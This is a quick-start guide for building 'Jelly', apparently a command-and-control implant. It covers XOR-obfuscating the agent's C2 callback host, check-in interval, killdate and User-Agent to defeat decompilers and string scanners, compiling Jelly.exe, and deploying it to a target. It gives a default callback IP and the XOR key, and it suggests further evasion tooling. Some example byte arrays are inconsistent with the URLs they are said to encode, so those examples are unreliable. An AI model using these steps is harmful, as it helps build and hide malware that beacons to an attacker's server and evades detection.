# Quick Start: Encrypting & Building Jelly with Obfuscation

## TL;DR - 3 Step Process

1. **Obfuscate your C2 URL**
2. **Update Config.cs**
3. **Build**

---

## Step 1: Generate Obfuscated Values

### Option A: Single Value (Recommended for quick changes)

```powershell
cd d:\Jelly\Payload_Type\Jelly\Jelly\agent_code
python auto_obfuscate_config.py --value "https://your-c2-server.com"
```

**Example Output:**
```
Plain:      https://your-c2-server.com
C# Code:    UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 45, 13, 234, 76, ... })
```

### Option B: Generate Complete HTTP Profile (All values at once)

```powershell
python auto_obfuscate_config.py --generate-http
```

Generates obfuscated versions of:
- callback_interval, callback_jitter, callback_port
- callback_host (your C2 URL)
- post_uri, encrypted_exchange_check
- killdate, User-Agent
- proxy settings (empty by default)

---

## Step 2: Update Config.cs

### For Single Value Change:

1. Open `Jelly\Config.cs`
2. Find the config parameter you want to change (e.g., `callback_host`)
3. Replace the entire `UnobfuscateString(new byte[] { ... })` call with your new obfuscated code from Step 1
4. Update the comment to show the original value

**Example:**
```csharp
// OLD:
{ "callback_host", UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 115, 74, 176, 14, 150, 109, 230, 32, 112, 74, 176, 7, 153 }) },  // Original: "https://16.170.226.88"

// NEW:
{ "callback_host", UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 45, 13, 234, 76, 129, 43, 239, 97, 100, 5, 190, 22, 130, 56, 180 }) },  // Original: "https://your-c2-server.com"
```

### For Complete Profile Replacement:

1. Open `Jelly\Config.cs`
2. Find the HTTP profile Parameters section (lines ~114-126)
3. Replace the entire Parameters dictionary with output from `--generate-http`
4. Save

---

## Step 3: Build the Payload

### Using Visual Studio:
```
File > Open > Jelly.sln
Right-click Jelly project > Build
```

### Using Command Line (Recommended):
```powershell
cd d:\Jelly\Payload_Type\Jelly
dotnet build -c Release
```

### Build Output:
```
Jelly\bin\Release\Jelly.exe  ← Your obfuscated payload
```

---

## Verify Obfuscation Works

### Check 1: Binary is Obfuscated
1. Open `Jelly\bin\Release\Jelly.exe` with **dnSpy** (or ILSpy)
2. Navigate to `Config` class
3. Look for `callback_host` and similar values
4. **Expected:** See `byte[] { 42, 8, 234, 79, ... }` instead of readable URLs
5. **Bad:** If you see plain text URLs, obfuscation failed

### Check 2: Runtime Deobfuscation Works
1. Run the payload in your test environment
2. The payload should correctly connect to your C2 server
3. Check C2 logs for successful beacon

---

## Common Config Values to Change

### Change C2 Server URL:
```powershell
python auto_obfuscate_config.py --value "https://my-attacker-ip.com:8443"
```
Then update `callback_host` in Config.cs

### Change Callback Interval (check-in frequency):
```powershell
python auto_obfuscate_config.py --value "5"
```
Then update `callback_interval` in Config.cs

### Change Killdate (agent expiration):
```powershell
python auto_obfuscate_config.py --value "2026-12-31"
```
Then update `killdate` in Config.cs

### Change User-Agent:
```powershell
python auto_obfuscate_config.py --value "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```
Then update `User-Agent` in Config.cs

---

## Full Workflow Example

**Goal:** Create obfuscated Jelly payload for C2 at `192.168.1.100:8443`

### Step 1: Obfuscate the URL
```powershell
cd d:\Jelly\Payload_Type\Jelly\Jelly\agent_code
python auto_obfuscate_config.py --value "https://192.168.1.100:8443"
```

**Output:**
```
Plain:      https://192.168.1.100:8443
C# Code:    UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 115, 74, 176, 14, 150, 109, 230, 32, 112, 74, 176, 7, 153, 27, 245, 85, 132 })
```

### Step 2: Update Config.cs
Open `Jelly\Config.cs` and find:
```csharp
{ "callback_host", UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 115, 74, 176, 14, 150, 109, 230, 32, 112, 74, 176, 7, 153 }) },
```

Replace with:
```csharp
{ "callback_host", UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 115, 74, 176, 14, 150, 109, 230, 32, 112, 74, 176, 7, 153, 27, 245, 85, 132 }) },  // Original: "https://192.168.1.100:8443"
```

### Step 3: Build
```powershell
cd d:\Jelly\Payload_Type\Jelly
dotnet build -c Release
```

### Step 4: Use the Payload
```
Jelly\bin\Release\Jelly.exe
```

Deploy to target. It will connect to your C2 at `https://192.168.1.100:8443` with all sensitive values obfuscated.

---

## Troubleshooting

### Problem: "Input string was not in a correct format" error at runtime

**Cause:** Obfuscated byte array is incorrect

**Solution:**
1. Re-run the obfuscation tool to get fresh bytes
2. Copy the exact output (including all byte values)
3. Paste into Config.cs exactly as shown
4. Rebuild

### Problem: dnSpy shows plain text URLs (not obfuscated)

**Cause:** Config.cs wasn't rebuilt or wrong build configuration used

**Solution:**
1. Clean: `dotnet clean`
2. Rebuild: `dotnet build -c Release`
3. Verify file: `Jelly\bin\Release\Jelly.exe` (check modified timestamp)

### Problem: Payload doesn't connect to C2

**Cause:** C2 URL is wrong or network issue

**Solution:**
1. Verify C2 is running and listening on the port you specified
2. Test connection manually: `curl https://your-c2-url:port`
3. Check firewall rules allow outbound HTTPS
4. Re-generate and verify the obfuscated URL matches your C2 address

### Problem: "The term 'dotnet' is not recognized"

**Cause:** .NET SDK not installed or not in PATH

**Solution:**
1. Install .NET Framework 4.5.1 SDK
2. Or use Visual Studio to build instead

---

## Configuration Reference

All these values can be obfuscated using the tool:

| Parameter | Default | Purpose |
|-----------|---------|---------|
| callback_host | https://16.170.226.88 | Your C2 server URL |
| callback_interval | 10 | Seconds between check-ins |
| callback_jitter | 23 | Randomization % for interval |
| callback_port | 8443 | C2 server port |
| post_uri | data | URI path agent posts to |
| encrypted_exchange_check | true | Enable encryption |
| killdate | 2026-11-21 | Agent expiration date |
| User-Agent | Mozilla/5.0... | HTTP user agent string |

---

## How Obfuscation Works

```
Your Plain Text Value
        ↓
    UTF-8 Encode
        ↓
    XOR with Key (0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12)
        ↓
    Byte Array (e.g., { 42, 8, 234, 79, ... })
        ↓
    Store in Config.cs as UnobfuscateString(new byte[] { ... })
        ↓
    Build Binary
        ↓
    At Runtime: UnobfuscateString() XORs bytes again
        ↓
    Original Value Recovered in Memory
```

**Result:** dnSpy/ILSpy show byte arrays (unreadable), but payload uses real values at runtime.

---

## Advanced: Generate All Profiles at Once

If you want to generate HTTP, WebSocket, SMB, and TCP profiles all obfuscated:

```powershell
python auto_obfuscate_config.py --generate-http
python auto_obfuscate_config.py --generate-websocket
```

Copy each output into the corresponding profile section in Config.cs.

---

## Security Note

This XOR obfuscation protects against:
- ✅ Casual decompiler inspection (dnSpy showing readable strings)
- ✅ Automated string extraction tools
- ✅ Quick static analysis

It does NOT protect against:
- ❌ Determined reverse engineers (can extract XOR key from binary)
- ❌ Dynamic analysis (watching memory at runtime)
- ❌ Brute-forcing small 8-byte keyspace

For production red team operations, consider additional protections like code obfuscation frameworks (ConfuserEx) or .NET native compilation.

---

## Files Used in This Process

```
agent_code/
├── auto_obfuscate_config.py      ← Obfuscation generator
├── xor_obfuscate.py              ← Original tool (legacy)
├── Jelly/
│   ├── Config.cs                 ← Edit this with obfuscated values
│   ├── ConfigObfuscator.cs       ← Helper class (for reference)
│   └── Jelly.csproj              ← Build configuration
└── Jelly.sln                      ← Solution file
```

---

## Quick Command Reference

| Task | Command |
|------|---------|
| Obfuscate single value | `python auto_obfuscate_config.py --value "text"` |
| Generate HTTP profile | `python auto_obfuscate_config.py --generate-http` |
| Interactive menu | `python auto_obfuscate_config.py` |
| Build payload | `dotnet build -c Release` |
| Clean build | `dotnet clean && dotnet build -c Release` |

---

**Ready to go!** Use the Quick Start above for your next obfuscated payload build.
